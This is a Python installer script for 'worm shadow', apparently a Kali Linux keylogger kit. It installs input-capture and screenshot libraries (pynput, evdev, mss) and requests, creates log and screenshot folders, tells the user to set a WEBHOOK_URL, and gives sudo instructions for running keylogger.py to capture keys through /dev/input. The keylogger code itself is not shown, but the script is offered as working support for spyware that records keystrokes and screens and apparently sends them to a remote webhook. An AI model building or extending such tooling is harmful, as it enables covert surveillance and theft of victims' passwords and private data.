#!/usr/bin/env python3
# worm shadow — kali setup for the linux all-in-one logger
# idempotent: safe to run repeatedly
import os
import sys
import shutil
import subprocess
from pathlib import Path

# ---------- config ----------
VENV_DIR = Path(".venv")
LOG_DIR = Path("logs")
SHOT_DIR = Path("screenshots")
REQUIRED_APT = ["xdotool", "python3-venv", "python3-full", "python3-dev", "libx11-dev"]
REQUIRED_PY = ["pynput", "mss", "evdev", "requests"]
CONFIG_FILE = Path("config.py")
CONFIG_EXAMPLE = Path("config.example.py")


# ---------- helpers ----------
def run(cmd, check=False, quiet=False):
    if not quiet:
        print(f"[setup] $ {' '.join(cmd)}")
    return subprocess.run(
        cmd, check=check,
        stdout=subprocess.DEVNULL if quiet else None,
        stderr=subprocess.DEVNULL if quiet else None,
    )


def have(cmd):
    return shutil.which(cmd) is not None


def pkg_installed(pkg):
    r = subprocess.run(
        ["dpkg", "-s", pkg],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    return r.returncode == 0


# ---------- system deps ----------
def install_system_deps():
    if not have("apt"):
        print("[setup] no apt — install manually: " + ", ".join(REQUIRED_APT))
        return
    to_install = [p for p in REQUIRED_APT if not pkg_installed(p)]
    if not to_install:
        print("[setup] system deps already installed.")
        return
    print(f"[setup] installing system deps: {', '.join(to_install)}")
    run(["sudo", "apt", "update"], check=False)
    run(["sudo", "apt", "install", "-y"] + to_install, check=False)


# ---------- venv ----------
def make_venv():
    if VENV_DIR.exists():
        print(f"[setup] venv exists — skipping: {VENV_DIR.resolve()}")
        return
    print("[setup] creating venv...")
    run([sys.executable, "-m", "venv", str(VENV_DIR)], check=True)


def venv_python():
    return VENV_DIR / "bin" / "python"


def venv_pip():
    return VENV_DIR / "bin" / "pip"


def install_python_deps():
    if not venv_pip().exists():
        print("[setup] venv pip missing — venv broken? delete .venv and re-run.")
        return
    print("[setup] syncing python deps (fast if nothing to do)...")
    run([str(venv_pip()), "install", "-q", "--upgrade", "pip"], check=False)
    r = run([str(venv_pip()), "install", "-q"] + REQUIRED_PY, check=False)
    if r.returncode != 0:
        print("[setup] pip install returned non-zero — see output above.")


# ---------- dirs ----------
def make_dirs():
    LOG_DIR.mkdir(exist_ok=True)
    SHOT_DIR.mkdir(exist_ok=True)
    print(f"[setup] logs:        {LOG_DIR.resolve()}")
    print(f"[setup] screenshots: {SHOT_DIR.resolve()}")


# ---------- config ----------
def ensure_config():
    if CONFIG_FILE.exists():
        print(f"[setup] config.py exists — leaving it alone.")
        return
    if CONFIG_EXAMPLE.exists():
        print("[setup] creating config.py from config.example.py")
        CONFIG_FILE.write_text(CONFIG_EXAMPLE.read_text(), encoding="utf-8")
        print("[setup]   → edit config.py and set your WEBHOOK_URL")
    else:
        print("[setup] no config.py and no config.example.py")
        print("[setup]   → create config.py manually with WEBHOOK_URL etc.")


# ---------- session / env ----------
def check_session():
    session = os.environ.get("XDG_SESSION_TYPE", "unknown").lower()
    desktop = os.environ.get("XDG_CURRENT_DESKTOP", "unknown")
    print(f"[setup] session: {session} | desktop: {desktop}")
    if session == "wayland":
        print("[setup] wayland detected:")
        print("[setup]   - pynput key capture won't work (x11-only)")
        print("[setup]   - keylogger uses evdev on /dev/input — needs sudo")
        print("[setup]   - cleanest option: log out → pick 'Xorg' session")
    return session


def check_dev_input():
    import glob
    devs = glob.glob("/dev/input/event*")
    readable = [d for d in devs if os.access(d, os.R_OK)]
    print(f"[setup] /dev/input: {len(devs)} device(s), {len(readable)} readable as user")
    if not readable:
        print("[setup]   → run keylogger with sudo for /dev/input mode")


# ---------- verify ----------
def verify():
    print("[setup] verifying venv imports...")
    if not venv_python().exists():
        print("[setup]   venv python missing — delete .venv and re-run setup")
        return False
    ok = True
    for mod in REQUIRED_PY:
        r = subprocess.run(
            [str(venv_python()), "-c", f"import {mod}"],
            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
        )
        if r.returncode == 0:
            print(f"[setup]   {mod}: ok")
        else:
            err = r.stderr.decode(errors="ignore").strip().splitlines()
            short = err[-1] if err else "unknown"
            print(f"[setup]   {mod}: FAILED — {short}")
            ok = False
    if have("xdotool"):
        print("[setup]   xdotool: ok")
    else:
        print("[setup]   xdotool: MISSING")
        ok = False
    if CONFIG_FILE.exists():
        print("[setup]   config.py: ok")
    else:
        print("[setup]   config.py: MISSING (create it before running keylogger)")
        ok = False
    return ok


# ---------- main ----------
def main():
    print("=" * 55)
    print("  worm shadow — kali linux logger setup")
    print("=" * 55)

    session = check_session()
    install_system_deps()
    check_dev_input()
    make_venv()
    install_python_deps()
    make_dirs()
    ensure_config()

    print("-" * 55)
    if verify():
        print("[setup] all good.")
        venv_py = venv_python()  # do NOT .resolve() — keeps venv context under sudo
        if session == "wayland":
            print("[setup] run (needs sudo for /dev/input key capture):")
            print(f"[setup]   sudo {venv_py} keylogger.py")
        else:
            print("[setup] run:")
            print(f"[setup]   {venv_py} keylogger.py")
            print("[setup] or with sudo for evdev backend:")
            print(f"[setup]   sudo {venv_py} keylogger.py")
        print("[setup] update later with:")
        print("[setup]   ./update.sh")
    else:
        print("[setup] something is missing — fix above and re-run.")
    print("=" * 55)


if __name__ == "__main__":
    main()
